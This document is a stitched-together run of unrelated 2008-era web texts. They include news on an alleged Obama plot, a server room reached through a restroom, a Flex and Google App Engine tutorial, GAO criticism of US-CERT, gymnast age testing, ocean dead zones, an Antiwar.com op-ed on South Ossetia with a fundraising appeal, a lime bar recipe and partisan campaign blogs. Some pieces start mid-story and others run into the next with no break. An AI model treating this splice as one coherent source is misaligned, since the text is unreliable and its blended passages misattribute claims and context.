The group is being held on weapons and drug charges .
Under questioning , the group revealed that they planned to kill Obama during his nationally televised speech at Invesco Field on Thursday night .
They are each being held in Arapahoe County jail on $ 50,000 bail .
Several federal law enforcement agencies have been investigating the threat for the past 48 hours and believe that the group of drug using criminals posed no credible threat to Obama .
A news conference will be held at 4:00 p.m.
Denver time on Tuesday by FBI , Bureau of Alcohol , Tobacco , Firearms and Explosives , and Aurora police .
Aurora is 25 minutes from Denver .

A few months back , Jen Frickell 's company was given some bad news .
When their lease ended , they'd have to move out of their second - floor suite .
The good news , however , was that a suite would be available on the first floor .
All they 'd need to do was pack up and move downstairs .
It was a fairly reasonable request , so the company 's executives signed a new lease and prepared to move .
There was , however , just one , small hitch .
The nice little server room they built in the back of their office - equipped with air conditioning units , ventilation , dedicated power , backup power , and so on - could not be relocated .
Not only would it cost too much , but there was simply no room for it .
The server room would just have to remain upstairs .
Obviously , the new second - floor tenant would n't want their neighbors walking through their office to access a server room , so building management and the company 's executives came up with an alternative : wall off the server room door and build a new one .
It seemed simple enough , but there was , however , just one small hitch .
The only available wall to install a door was adjacent to the women 's restroom .
Inside the handicapped stall .
And since you 're reading about it here , you know that did n't stop them .
Here is the email from building management :
From : ---- --------
Sent : Monday , May 5 , 2008 4:37 PM
To : Everyone Subject : Server Room Access
Hi all .
As you all are aware , we have new tenants that have moved into the 2nd floor suites .
The access to the server room is now via the women ’s bathroom .
There will be a sign on the woman ’s door that can be changed from OPEN to CLOSED and vice versa .
Should you need to enter the server room , please change the sign to CLOSED .
Once you are done , please change it back to OPEN .
Once you enter the bathroom , you will be able to access the server room via the handicapped stall .
Please close the stall door prior to entry , just in case someone does n’t see that the bathroom is closed .
I know this is n’t ideal , but if we adhere to this protocol , I do n’t think anyone will be disrupted .
Thanks !
Let me know if you have any questions .

Many young men will readily admit that they bought their first car to impress the opposite sex .
But it seems most end up with fonder memories of the motor than the girl .
A survey reveals that the majority of Britons remember their first car more readily than their first kiss .
Scroll down for more ...
Popular : the most common first car is the Ford Fiesta
Getting a set of wheels ranked more highly for young people than their initial embrace , their first boyfriend or girlfriend and their 18th birthday .
Indeed more than four in ten of those surveyed were so attached to their first car that they could recall its number plate in full , the survey by organisers of the British International Motor Show found .
The most common first car was a Ford Fiesta , followed by a Ford Escort , Mini and Nissan Micra , most of which were between six and ten years old .
Six in ten regarded their first car as female , a quarter gave it a name and 12 per cent felt more attractive to the opposite sex once they had qualified to drive .
More than a third had sex in the back seat of their first car , and half took the opportunity to leave home once they had wheels .
Not surprisingly , the poll of 2,011 adults also showed that 59 per cent saw passing the driving test as a life - changing event .
Nearly six in ten of those polled passed their driving test first time , but more than 10 per cent needed at least three attempts .
Kirsty Perkinson , one of the show organisers , said : " People develop powerful bonds with their cars , especially their first .
" First cars represent an explosion of independence and a gateway to untold adventures , which is why they are so special . "

It turns out that there is more hope for America than I thought .
After a week full of errors and general stupidity from John McCain , voters have begun to realize that he really is Bush 2.0 .
The latest Gallup poll shows a 4 - point lead for Barack Obama , the first statistically significant lead he has held since the convention .
The beginning of McCain ’s troubles came last week , when the media realized exactly how dishonest his attack ads had become .
Then late Sunday night , the news of Lehman Brothers ’ collapse sent Wall Street into a frenzy , shown by the rapid collapse of stocks on both Monday and Wednesday , which were followed by reasonable bounces back toward the normal value on Tuesday and today , respectively .
On Monday , McCain said “ the fundamentals of our economy are strong . ”
By Tuesday , he had changed his mind .
He seems to be forgetful now , too , as he often answers questions with completely obscure facts .
When asked about Sarah Palin ’s national security experience , McCain felt it necessary to point out that she had been a star point guard in high school .
What ’s even more sad is the fact that the audience actually cheered him on for making that statement .
I can only assume they were saying , “ WOO , this guy ’s an idiot , but at least our possible - 50 % - chance - to - be- president Sarah Palin can nail her free throws ! ”
How do you tell the age of a Chinese gymnast ?
Do n’t bother with those government - issued passports or birth certificates .
Go for the X -rays .
For all the global hand - wringing over how international gymnastics officials will ever figure out whether three members of the Chinese women ’s team were old enough to compete , doctors and forensics experts said it ’s actually not too difficult .
Advertisement
The science of determining age is has been honed by decades of treating patients with growth disorders , identifying youthful homicide victims and determining the deportation status of illegal immigrants .
“ It would be relatively easy , ” said Dr. David Senn , a forensic odontologist at the University of Texas Health Sciences Center who has analyzed numerous X - rays of immigrants apprehended at the border .
The science is based on measuring the growth of bones and teeth as children mature .
Decades of data have been distilled into detailed tables recording the precise size and shape of skeletal components broken down by age , sex and race .
The task is so straightforward that Dr. Peter Hampl , president of the American Board of Forensic Odontology , said the Chinese government should just consent to X - rays and let the films speak for themselves .
Advertisement
“ If there is nothing to be afraid of , let their kids be X - rayed , ” he said .
“ It ’s almost incriminating if they do n’t . ”
It may seem strange that amid the outsized pageantry of the Beijing Games , the biggest controversy has surrounded three tiny Chinese gymnasts whose combined weight is 216 pounds .
The ages of He Kexin , Yang Yilin and Jiang Yuyuan came into question weeks ago after the discovery of online registration records listing birth dates that would make all three girls 14 years old .
Olympic rules require that a gymnast be at least 16 during the year the Games are held .
The government attempted to put the issue to rest by producing passports that declared the girls met the age requirement .
The controversy reached Olympian proportions after the Chinese team beat the American gymnasts in the team competition .
In addition to the team gold , He edged American Nastia Liukin for the top prize in uneven bars by a tiebreaker , and Yang won the bronze medal in that event and in the all - around competition .
Advertisement
After new complaints surfaced , the International Olympic Committee announced Friday that it was asking the International Gymnastics Federation to reexamine the Chinese gymnasts ’ age .
Instead of searching through documents , the matter could be settled with X - rays , said Dr. Gil Brogdon , a professor emeritus of radiology at the University of South Alabama in Mobile and author of the textbook “ Forensic Radiology . ”
Bones fuse together according to a well - documented schedule .
For girls between the ages of 13 and 17 , the best places to look are the knee , wrist , elbow and iliac crest on the pelvis , he said .
The younger they are , the more obvious the evidence .
“ A Caucasian girl is going to fuse her knee centers at about age 15 ; they ’re going to fuse their iliac crest at about age 16 ; and part of the elbow will start fusing around 13 or 14 , ” he said .
“ That ’s the way you do it . ”
Advertisement
For the Chinese gymnasts , investigators would have to consult growth tables for Asian girls , Brogdon said .
One complication with teenage girls is that strenuous exercise can suppress estrogen production , delaying bone development and making them appear to belong to a younger person , said Dr. Vicente Gilsanz , a professor of radiology and pediatrics at USC .
But Brogdon said that by comparing multiple bones , “ you could come pretty close ” to distinguishing a 14 - year - old from a 16 - year - old .
Teeth are also useful .
U.S. immigration authorities often rely on dental X - rays to determine for deportation purposes whether an illegal immigrant is an adult or a minor .
Advertisement
“ Of course , everybody who gets arrested says they are 17 , ” Senn said .
He said he can pinpoint ages within 18 months using images of a person ’s wisdom teeth , which start forming around age 9 and are not fully developed until around 19 .
For the Chinese gymnasts , Senn said , he would also look at their second molars , which grow until age 15 or so .
Dr. Michael Baden , chief forensic pathologist for the New York State Police , said that with both teeth and skeletal X - rays , “ you should be able to get within 12 months ” of someone ’s age .
All this science probably wo n’t mean much because Chinese authorities are not likely to agree to let independent doctors take X - rays of their gymnasts .

In that case , sports fans will be left to contemplate the girls ’ physical appearance .
“ I must say , they do look kind of young , ” Baden said .

Times staff writers Mary Engel and John Johnson Jr. contributed to this report .
The U.S. Government Accountability Office ( GAO ) is finalizing its report on the country 's capability to protect and defend itself from cyber- attack , and its words are not kind .
The primary responsibility for monitoring and securing the country 's networks and digital assets falls to the United States Computer Emergency Readiness Team , or US - CERT , a partnership organization between the Department of Homeland Security ( DHS ) and both the public and private sectors .
Founded in September 2003 , US - CERT was responsible for the 2004 Einstein initiative , meant to detect and collect information on attacks at government agencies , and is currently backing the expanded ( and hopefully more widely deployed ) Einstein 2 program .
Unfortunately for US - CERT , the GAO report is more interested in today 's events than the organization 's future plans .
The draft report BusinessWeek obtained states that US - CERT " still does not exhibit aspects of the attributes essential to having a truly national capability . "
Later in the document , GAO claims that the organization " lacks a comprehensive baseline understanding of the nation 's critical information infrastructure operations , does not monitor all critical infrastructure information systems , does not consistently provide actionable and timely warnings , and lacks the capacity to assist in mitigation and recovery in the event of multiple , simultaneous incidents of national significance . "
Not surprisingly , US - CERT has challenged this evaluation .
While the organization admits there have been problems , DHS spokesperson Laura Keehner stated : " We are undertaking something not unlike the Manhattan Project .
We have set a strong cyber - strategy , recently created the National Cyber Security Center , and are in the process of aggressively hiring several hundred analysts to further our mission of securing critical infrastructure . "
She goes on to detail DHS ' commitment to working with the public and private sector in securing the nation 's infrastructure , and we saw some evidence of that when new NCSC director Rod Beckstrom attended and spoke at Black Hat .
Beckstrom believes that the best and brightest from both sectors will need to cooperate if the nation wishes to secure its infrastructure , and generally advocates information - sharing and cooperation .
GAO , however , has not been swayed by DHS ' rhetoric , despite the agency 's plans to expand the Einstein program , hire more analysts , and aggressively expand its real - time intrusion detection and response systems .
From the draft report : " It is unclear whether these actions will help US - CERT — or whatever organizational structure is ultimately charged with coordinating national cyber - analysis and warning efforts — achieve the objectives " [ of the security initiatives set before it ] .
With the Bush era drawing to a close , the issues GAO raises in its draft report will be of significant concern to the next president , whoever that may be .
It 's not clear when the final version of this report will be released , but an independently convened commission is due to report on its own findings , which apparently echo at least some of GAO 's findings , to the next president in November .
The next commander - in - chief will be presented with an up - to - date and current briefing on both the country 's current and future cybersecurity initiatives , but what happens afterwards is anyone 's guess .
Parts of the world 's oceans are running low on oxygen , a new study finds .
Fertilizers and other chemical pollutants in river runoff fuel blooms of algae that cause oxygen levels to dip precipitously when they die .
A review of research into these so - called " dead zones , " detailed in the Aug. 15 issue of the journal Science , finds that the number of dead zones has roughly doubled every decade since the 1960's .
The study authors , Robert Diaz of the Virginia Institute of Marine Science and Rutger Rosenberg of the University of Gothenburg in Sweden , tallied 405 dead zones in coastal waters worldwide today , affecting about 95,000 square miles ( 245,000 square kilometers ) of ocean , an area about the size of New Zealand .
While that may seem small compared to the total coverage of the oceans , the local effects can be devastating to marine ecosystems .
These dead zones occur when fertilizer runoff dumps excess nutrients , such as nitrogen and phosphorous , into coastal waters , providing food for algae .
When these microscopic plants die and sink to the ocean bottom , bacteria feed on them and subsequently consume all the oxygen dissolved in the water .
This leaves fish and other bottom - dwelling sea creatures without enough oxygen to survive , causing mass die - offs and displacements .
Typically , the researchers noted , these events are n't noticed until they threaten valuable fish stocks .
The world 's largest dead zone is in the Baltic Sea .
The largest dead zone in the United States sits in the Gulf of Mexico at the mouth of the Mississippi River and is about the size of New Jersey .
Scientists have predicted that the Gulf dead zone could grow larger than ever this summer .
Diaz and Rosenburg said that dead zones now rank as one of " the key stressor [s ] on marine ecosystems , " along with over - fishing and habitat loss .
" There is no other variable of such ecological importance to coastal marine systems that has changed so drastically over such a short time as dissolved oxygen , " they wrote .
With the possibility that climate change could exacerbate the situation through changes in ocean circulation , Diaz and Rosenburg recommend cutting back the amount of nitrogen - rich fertilizer that runs off into rivers .

Quiz : What 's Your Environmental Footprint ?
When I decided to learn and get some first - hand experience about Rich Internet Applications ( RIA ) and distributed application hosting ( cloud computing ) , I chose to do it using Flex and the Google App Engine .
Flex is a mature tool that has a plethora of rich interface capabilities and is very good to connect to services on the Web .
And the App Engine is a very intriguing proposition where you use Google ’s infrastructure to run your application .
To share my experience and get some feedback I started a project called “ Flex and Python Test ” .
Now this project is finished and released .
The application is a very simple project portfolio that can keep a list of projects and participants .
The data is kept on the client for fast response , and the modifications are sent to the server for persistence .
This is what the application looks like :
The source code for this application is available on github .
If you want to understand it , download it and browse the code .
To help , I will explain a bit about the design .
This is the general architecture :
The client is a Flex application running in a browser .
Flex allows us to have a rich interface without dealing with incompatibilities between browser implementations .
The server is a Python application running in Google App Engine .
The client send requests through HTTP using the AMF encoding format .
This is a binary format that is very efficient for Flex applications .
The server processes the requests and sends responses also encoded in AMF .
The server exposes its interface in the Remote Procedure Call ( RPC ) pattern .
If you download the source , take a look at README. txt .
It explains how to run and deploy the application .
There are three directories : flex - client contains the Flex application that will run in the browser .
python - client contains an alternate client in Python that you can run in your computer to initialize data , test the service and learn the API .
server contains the Python service that is deployed to Google App Engine .
To build the Flex client I decided to use a Model - View - Controller ( MVC ) framework .
A sound structure helps when you want to build larger applications .
After experimenting with Cairngorm , I went for PureMVC .
If I would make another iteration I might now try Mate .
With PureMVC , this is the overall architecture of my client application :
The Model represents the data .
It uses the Proxy pattern to control access to the remote service .
The View contains the user interface .
It uses the Mediator pattern to implement Supervising Presenters that manage the interface components .
The Controller contains business logic .
It uses the Command pattern to execute actions that interact with several other components .
The model , view and controller objects communicate using a Publish / subscribe - style Observer notification scheme .
For instance , this is how the Participants proxy asks the server to insert a new participant :
public function addParticipant ( participant : Participant ) : void { ServiceGateway.GetConnection ().call ( " ProjectParticipantsService.save " , new Responder ( onAddParticipantResult , on Fault ) , participant.toDto( ) ) ; }
On the server side , Google App Engine takes care of executing your application when it receives requests .
The Python application uses PyAMF to decode the client requests and execute the service operation that is being called .
The data that is transferred between the client and the server is stored in Data Transfer Objects ( DTOs ) .
Since both Python and Actionscript are dynamic languages , I did n’t declare formal type structures for these DTOs .
They are just dynamic objects .
The service operations use App Engine ’s Datastore API to store and retrieve objects .
This is how the ProjectParticipants service executes the operation to insert a new participant :
def save ( self , participant_dto ) : if hasattr ( participant_dto , ' _key ' ) and participant_dto._key != None : return self.update( participant_dto ) else : return self.insert(participant_dto ) def insert ( self , participant_dto ) : participant = ProjectParticipant ( ) participant .
project = Project.get(participant_dto.project_key ) participant.name = participant_dto.name participant.put ( ) return self.to_dto( participant )
Some of my previous posts have more details about how I built this application :
I ’ve deployed this sample application to Google App Engine .

If you refresh the homepage you should see the updates you made .
I hope this can help other people who want to learn some of these techniques and tools .

Teachers win right to frisk pupils for drink , drugs and cigarettes
Crafty smoke :
But teachers have won the right to frisk pupils for inappropriate items , such as cigarettes
Teachers will be able to frisk pupils for drugs , alcohol , cigarettes and stolen goods in a crackdown on bad behaviour .
Staff will win the legal right to conduct forcible searches of those suspected of smuggling in ' inappropriate items ' in a drive to stop a growing culture of drug - taking and under - age drinking spilling into schools .
Children 's Secretary Ed Balls will accept a recommendation from the Government 's ' behaviour - tsar ' to extend existing powers - allowing teachers to frisk for knives and guns .
Sir Alan Steer , appointed by ministers to advise on measures to improve discipline , believes the weapon search powers in place since June last year need to operate in conjunction with rights to look for contraband items .
But he will say that headmasters see binge - drinking among teenagers as a more serious problem - than drugs for their schools .
Mr Balls welcomed Sir Alan 's plans and signalled that ministers will bring in legislation to implement extended search powers .
Schools can already look for weapons by removing children 's jackets and jumpers and ' patting down ' their clothing .
They can also screen them using the sort of metal detectors seen at airports .
But while they can ask pupils suspected of possessing drugs to turn out their pockets and open their bags and are protected if they search a jacket or a bag with the pupil 's consent , only police can frisk for drugs or other items .
Staff must call their local force if they believe a search is warranted .
Mr Balls said : ' I want to build on the powers we have given teachers following Sir Alan 's recommendations on searching for weapons by extending these to cover drugs , alcohol and other inappropriate items .
' It will ensure that everyone knows a teacher 's authority in the classroom is unquestionable and teachers are clear about their right to use them . '
Figures from his department show that 400 pupils were expelled last year for drug and alcohol - related offences , and there were 8,180 suspensions .
Surveys suggest that growing numbers of pupils are turning up to lessons drunk or hungover .
Teachers ' leaders gave only a guarded welcome to the proposals last night .
Dr Mary Bousted , general secretary of the Association of Teachers and Lecturers , said : ' Teachers would need to exercise these powers with great caution .
' While teachers may have the power to search , we do n't have the power to stop the pupil reacting against the search , and the reaction could be extreme .
' These pupils are not likely to be models of good behaviour in the school community , and any situation could be extremely volatile .
' If teachers are given these powers , which they would welcome them , they also need to be given protection and should not have to search alone . '
In other measures , parents will get text alerts before 10 am if their children are suspected to be playing truant or are late for school .
The aim is to give parents a greater role in tackling school indiscipline by giving them instant feedback on their children 's behaviour either through text messages or regularlyupdated online reports .
Mr Balls said : ' Both schools and parents need to work closely together to maintain discipline which is a fundamental ingredient to making sure children learn to the best of their abilities .
' I know of schools where parents are texted before 10 am if their child has not turned up - this kind of early alert really helps to nip problems in the bud .
' Online reporting can also help parents track their child 's progress and help them feel more involved . '
Speaking ahead of his report , Sir Alan , a long - serving headmaster , highlighted a culture of greed and incivility among adults as contributing to teen aggression and violence .
Despite heightened public concern about unruly youths , Sir Alan insisted problems should not be ' exaggerated ' .
His report , to be issued today , will also call for more schools to get parent support advisers to help families enforce discipline , and better teacher training in behaviour management .

Amid all the geopolitical analyses and ideological posturing on the occasion of the Three - Day War between Russia and Georgia , we are losing sight of the very real human costs of this conflict : thousands of civilians killed and grievously wounded , a city , Tskhinvali , the capital of South Ossetia , in ruins , and the hopes and dreams of the inhabitants of this largely overlooked backwater dashed on the rocks of a politician ’s hubris .
That politician is Mikheil Saakashvili , the all too glib president of Georgia , whose slickness is so apparent that it seems to leave an oily residue on every word he utters .
The decidedly apolitical , non-ideological Web site Reliefweb put it this way :
" The place that has suffered most is South Ossetia which is home to both ethnic Ossetians and Georgians , the latter accounting for about a third of the population .
The destruction there has been appalling and it looks as though many hundreds of civilians have died , in the first place as a result of the initial Georgian assault of August 7 - 8 .
Gosha Tselekhayev , an Ossetian interpreter in Tskhinvali with whom I spoke by telephone on August 10 said , ‘ I am standing in the city center , but there ’s no city left . ’
" Ossetians fleeing the conflict zone talk of Georgian atrocities and the indiscriminate killing of civilians . "
They may be talking of Georgian atrocities , but we in the West have not heard them  nor will we , given the bias of our media , which is in thrall to the Georgia lobby and its U.S. government sponsors .
The " mainstream " has already settled on a narrative to explain events in the Caucasus , and nothing short of a South Ossetian holocaust will wake them from their hypnotic state .
The Russians , in their view , have got to be the bad guys , i.e. , the aggressors .
Anything that does n’t fit into that storyline is cut from the script .
Yet , as Reliefweb reports :
" On August 7 , after days of shooting incidents in the South Ossetian conflict zone , Georgian President Mikheil Saakashvili made a speech in which he said that he had given the Georgian villagers orders not to fire , that he wanted to offer South Ossetia ‘ unlimited autonomy ’ within the Georgian state , with Russia to be a guarantor of the arrangement .
" Both sides said they were discussing a meeting the next day to discuss how to defuse the clashes .
" That evening , however , Saakashvili went for the military option .
The Georgian military launched a massive artillery attack on Tskhinvali , followed the next day by a ground assault involving tanks .
" This was a city with no pure military targets , full of civilians who had been given no warning and were expecting peace talks at any moment . "
As if to underscore the utter indifference of Western media to the suffering of anyone politically incorrect enough to be pro-Russian , CNN broadcast footage of war - torn Tskhinvali even as its news announcer solemnly " reported " that the Russians were wreaking devastation on a city in Georgia proper , a classic case of the Orwellian media manipulation techniques that pass for journalism in the West .
An unintended irony : the footage was a few feet from the spot where Russian peacekeepers had been slaughtered , the first victims of the Georgian assault .
Or was it intended ?
The tragicomic aspects of this media - induced cognitive dissonance came to the fore on Fox News the other day , when the announcer was interviewing a 12 - year - old American girl who happened to be sitting in a café in Tskhinvali when Georgian bombs started raining down on her head .
The announcer ’s eyebrows shot up when the girl thanked the Russian soldiers .
After the girl and her aunt finished their recounting of Georgian atrocities , the announcer capped off his report by intoning : " There are gray areas in war . "
The matter of attacking civilians is no doubt a moral " gray area " for the neocons at Fox , but what about the rest of the media  or is there no longer much of a difference , at least when it comes to the Russian question ?
The Georgians were the aggressors here , and not only that , it was a particularly vicious sneak attack , undertaken while " peace talks " were supposedly taking place .
As Reliefweb put it :
" The attack looked designed to take everybody by surprise  perhaps because much of the Russian leadership was in Beijing for the opening of the Olympic Games .
It also unilaterally destroyed the negotiating and peacekeeping arrangements , under the aegis of the Organization for Security and Cooperation in Europe , that have been in place for 16 years .
Russian peacekeeping troops based in South Ossetia were among those killed in the Georgian assault . "
The Georgian offensive provoked a massive exodus to the north .
Thousands fled , and with good reason .
As the Guardian reports :
" Many had traveled in their nightclothes on rocky roads through the mountains and gave bloodcurdling accounts of Georgian atrocities .
‘ I came in the boot of a car .
Georgian snipers were firing at us from the forest .
My brother stayed to fight .
Our grandparents ’ home was reduced to rubble .
We do n’t know where they are .
Nothing is left of their village .
It was totally destroyed by rockets and tank fire , ’ Alisa Mamiyeva , 26 , a teacher in Tskhinvali , said from the safety of Vladikavkaz in North Ossetia . "
The South Ossetians claim 1,400 dead , thus far , most of them victims of the Georgian assault on Tskhinvali , and Vladimir Putin went so far as to accuse the Georgians of launching a " genocide . "
According to the BBC , however , " Russia failed to back up its claims of Georgian atrocities . "
Not that the West is all that interested in airing the evidence .
As Variety put it in a piece on how this war is being reported ,
" Coverage in the U.S. and Europe is leaning heavily toward reports on the Georgian casualties of Russian bombing over the weekend .
Few details are being given about the thousands said to have been killed when Georgia attacked Tskhinvali , the capital of South Ossetia , on Thursday and Friday . "
The blatant media bias displayed by the " mainstream " news organizations is more than matched by the shameful cover -up of Georgian atrocities by the mainline " human rights " organizations , first and foremost Human Rights Watch .
In the most brazen display of willful ignorance since Walter Duranty overlooked the Soviet gulags , HRW spokeswoman Anna Neistat told the Guardian that Ossetian claims of Georgian atrocities were " suspicious " :
" The figure of 2,000 people killed is very doubtful .
Our findings so far do not in any way confirm the Russian statistics .
On the contrary , they suggest the numbers are exaggerated . "
Neistat avers that no more than 44 were killed and around 200 were wounded in the Georgian attack on Tskhinvali .
Perhaps she should talk to International Red Cross spokeswoman Anna Nelson , who reports area hospitals " overflowing " with the dead and the wounded .
The voices of the Ossetians are barely reaching the West , but when they do  as in this Australian Broadcasting Corp.
news report  they underscore the sheer ugliness of HRW ’s appalling apologetics : :
" One woman told how a family of four including two children tried to flee from a Georgian tank but it ‘ fired on their car and they were all burned ’ to death , said Angela , who like all the refugees only gave her first name .
In another incident , a woman eight months pregnant and two family members fleeing from the city under attack were hit by tank fire and ‘ nothing remained of them , ’ Angela said .
" She saw the Georgian tanks roll into Tskhinvali , the soldiers shouting ‘ Hail Saakashvili , ’ who is the president of Georgia .
‘ They destroyed the city , ’ added Inna , 33 , who said she could not understand how the Georgian troops ‘ could do that to civilians . ’
" ’ You see your friend ’s home burning and there ’s nothing you can do .
You just watch and cry , it ’s a genocide , ’ Inna said .
An old woman among the refugees said all she had left was the dress she was wearing .
‘ My house is destroyed , ’ she said . "
More important than the hypocrisy and ideology - induced moral myopia of the " human rights " crowd , however , is the very real human suffering that is being pointedly overlooked .
These are real people being killed and rendered homeless , people who now live in terror and uncertainty while we in the West sit around discussing the geopolitical implications as if individual human beings were pieces on a chessboard .
The U.S. is now delivering " humanitarian " aid under the aegis and protection of the U.S. military , a gesture that underscores the Bizarro World absurdity of a foreign policy that has us arming the Georgians and then paying to clean up the damage done by our proxies .
This is truly an odd sort of " humanitarianism , " one inextricably linked to the inveterate sadism of our foreign policy .
This " humanitarian " gambit is just that : a device designed to legitimize our growing intervention in the region .
While Defense Secretary Robert Gates is clearly not at all thrilled by the prospect of U.S. soldiers entering the battle zone , it seems unavoidable , at some point , since we ’ll be supervising " humanitarian " flights and relief efforts .
( Not to mention future military joint exercises involving U.S. and Georgian forces , such as the ones that concluded shortly before the war commenced . )
With Russian troops intent on staying in Ossetia , Abkhazia , and other regions such as Adjaria eager to take this opportunity to break free of the Georgian central government , the likelihood of renewed fighting is high .
To Antiwar.com ’s audience , and regular readers of this column , none of this  Saakashvili ’s folly , the Ossetian question , the volatile immediacy of the crisis  is anything new .
As I wrote in November 2006 :
" Russian ‘ peacekeepers , ’ OSCE ‘ observers , ’ South Ossetian troops , and the U.S. - trained - and - equipped Georgian military are facing off along ill - defined borders , with renegade ‘ rebel ’ bands supporting one side or the other running wild in the no-man ’s land in between .
This is a recipe for disaster , and an armed confrontation is bound to occur , with the distinct possibility of escalating into all - out warfare .
The Russians would soon be drawn in , and the U.S. could not escape being dragged into this particular vortex  with fateful consequences all ’round .
" I can just hear McCain barnstorming the country in ‘ 08 , denouncing ‘ Russian imperialism ’ and demanding that we ‘ stop Putin ’ in the Caucasus before Russian troops cross the Bering Straits . "
We at Antiwar.com have been warning of the dangers of Russophobia , which seems to have run rampant on the neoconservative right in recent days .
It was always present ( at least since the Kosovo war ) as an animating force on the " humanitarian interventionist " left , i.e. , George Soros & Co .
As much as I hate to say " I told you so , " in this case , it seems unavoidable , albeit not in very good taste .
Yet there ’s no time for such niceties , these days .
It is time to be blunt and get right to the point .
Antiwar.com is fighting a war on two flanks : a constant struggle against the disinformation dumped daily into the airwaves , most of it originating in the Washington offices of the War Party , and another battle on another front  a war for our very survival .
The rising costs , human as well as financial , of carrying on this campaign for truth are exacting a heavy toll .
Our tiny staff is grossly overworked , we ’re cutting corners left and right , and we do n’t know where the money to make it through the next quarter is going to come from .
And that ’s where you come in .
Look , you ’re being dunned daily on the main page of the site , and I do n’t want to hector you much more .
All I can say is that Antiwar.com has earned your financial support , and then some .
We ’ve been waging a pretty effective fight against the War Party , giving them tit for tat and giving our readers a far more realistic perspective on world events than any " mainstream " outlet .
Yet the War Party still poses a deadly danger , and they ’re always up to new tricks .
More importantly , we do n’t have the resources they can mobilize at a moment ’s notice , and we do n’t have any hopes of doing so .
But we do n’t need all that moolah .
We just need to reach the American people with our message , and we can do that quite effectively via the Internet .
They have mega-millions , but we have something they can never match : the credibility our brand name has built up over the years .
Since 1995 , we ’ve been in the front lines of the battle , breaking the real news and fact - checking government officials within an inch of their lives  and we need your help to keep going .
Once again , we ’re swimming against the tide on this South Ossetia - Georgia story , debunking the official media narrative and bringing our readers a commodity more precious than gold : the truth .
That ’s why it ’s so important that we continue our work , but we ca n’t do it without your support .
We depend on the generosity and acute awareness of our readers , who know how important it is to win the battle for hearts and minds .
We have the War Party on the run , but we need your support to keep going .

Well , I think I actually like these better than lemon bars .
Believe me , I have been checking and rechecking all day .
After eating at least seven for a late lunch ( after my earlier lunch of 3 slices of leftover banana bread ) , I can definitely say , with perfect confidence , that they are quite good .
But now I have headache .
Sorry they do n’t look very limey like the box mixes you can get in the store .
The eggs just make these look yellow .
If you look really closely , you can see the little flecks of lime zest .
That ’s as green as I could get them without adding green food coloring , which I would never do .
For the crust :
9 tablespoons unsalted butter ( 1 stick , plus one tablespoon )
1/4 cup ( 55g ) superfine sugar ( or regular granulated )
1 cup ( 150g ) of unbleached all - purpose flour
pinch salt
For the filling :
1 1/2 cups ( 330g ) superfine sugar ( or regular granulated )
3 eggs
2/3 cup ( 150g ) freshly squeezed lime juice ( from 4 - 5 limes )
2 tablespoons lime zest ( from 4 - 5 limes )
2/3 cup ( 100g ) unbleached , all - purpose flour
pinch of salt
1 tablespoon confectioner ’s sugar
1. Preheat oven to 350 degrees ( 180 degrees Celsius ) .
Line a 8×8 ?
* square baking pan with a strip of parchment paper ( 8×14 ? ) that covers the bottom and overlaps on either side .
( This is so after it cools , you can pull out the entire pan of lime bars and cut them neatly .
You can omit this step completely , though .
You do n’t even need to butter the pan . )
2. Cream butter , sugar , and salt with an electric mixer .
Mix in flour until just incorporated .
Press dough evenly into 8×8 ?
square baking pan .
3 . Bake for 20 - 25 minutes , or until slightly golden brown .
While it cools , prepare the filling .
4 . Whisk all ingredients except for the confectioner ’s sugar in a large bowl .
Pour into crust .
Bake for 30 - 35 minutes until filling is completely set .
Let cool completely .
( I help mine along in the freezer for about an hour . )
Using the overlapping edges of parchment paper , gently lift the dessert from the pan .
Cut into 16 squares .
Dust with confectioner ’s sugar .
Vista ’s death march picked up some pace yesterday , after a metrics researcher revealed that nearly 35 per cent of PCs built to run the Windows operating system have been downgraded to XP .
In a survey of more than 3,000 computers , performance testing software developer Devil Mountain Software estimated that more than one in three new machines had either been downgraded by vendors such as Dell , or by customers once they bought the PC .
The results were garnered by the research firm ’s CTO Craig Barth in collaboration with InfoWorld .
He based the numbers on Devil Mountain ’s Exo.performance .
network by collating the vendor and system model number with computer vendors ’ catalogues .
Barth used that data to identify PCs that had probably been shipped within the past six months – a period of time when it was highly likely that most new machines came pre-installed with Vista .
That ’s a damning verdict on an OS that Microsoft still wants frustrated customers to love .
But even in Redmond the mood has undergone a somewhat dramatic shift in recent days .
Microsoft wonks are now doing their best to stoke up interest about Windows 7 , the successor to Vista .
The company ’s Windows ’ boss Steven Sinofsky has even started up a new blog ( " honestly , I penned it , " he proclaims ) about the next operating system to ram home the message that Microsoft can do “ disclosure ” and deliver on time .
The software beast has already admitted it made some pretty big mistakes with Vista .
Now , after trying some heavy duty marketing , Microsoft has finally conceded it ’s high time to move on by explaining how MS will engineer Windows 7 .
Cue Sinofsky comparing his Windows team to a Mozart opera ... and also Goldilocks .
“ I 'm reminded of a scene from Amadeus , " he chimed , " where the Emperor suggests that the Marriage of Figaro contains ‘ too many notes ’ to which Mozart proclaims ‘ there are just as many notes , Majesty , as are required , neither more nor less . ’
Upon the Emperor suggesting that Mozart remove a few notes , Mozart simply asks ‘ which few did you have in mind ?’.
“ Of course the people on the team represent the way we get feature requests implemented and develop end to end scenarios , so the challenge is to have the right team and the right structure to maximise the ability to get those done – neither too many nor too few . ”
Whether the three bears – Apple , Linux and EU / US regulators – will wade in to spoil the party remains to be seen .
But Microsoft really does need to dish up an operating system that is " just right " this time . ®
GOP wo n’t let go of its new tire - gauge toy
Atrios asked this morning , “ Does anyone understand why Obama suggesting that people keep their tires properly inflated is some sort of hilarious gaffe ? ”
I ’ve been trying to figure out the same thing for days .
As the Obama campaign kicks off “ energy week ” with a new contrast ad and a policy speech in Michigan , Time ’s Mark Halperin reports , “ McCain supporters in Michigan will distribute tire gauges at Obama ’s energy speech in Lansing .
The RNC will also deliver gauges reading ‘ Obama ’s energy plan ’ to Washington newsrooms . ”
As of this morning , it looks like far - right blogs have received their copies of the Republican script , too .
RedState.org ’s Erick Erickson is on message : “ Inflating your tires and getting a regular tune - up sounds more like Obama ’s plan for ego maintenance than it does for helping American families . ”
Ed Morrissey added , “ … Obama refers to ‘ big oil ’ and the need to reduce our use of oil by 35 % over the next twenty years .
How do we get there ?
Keep inflating those tires , folks . ”
We are , quite obviously , in the midst of a very aggressive roll - out here .
John McCain criticized the notion of well - inflated tires on Friday , and Newt Gingrich described Obama ’s remarks as “ loony toons ” during a Fox News interview .
Yesterday morning on ABC , McCain said , “ It seems to me the only thing [ Obama ] wants us to do is inflate tires ” to improve gas mileage .
And over the weekend , Minnesota Governor Tim Pawlenty , still auditioning for the role of VP , took to using a tire gauge as a prop .
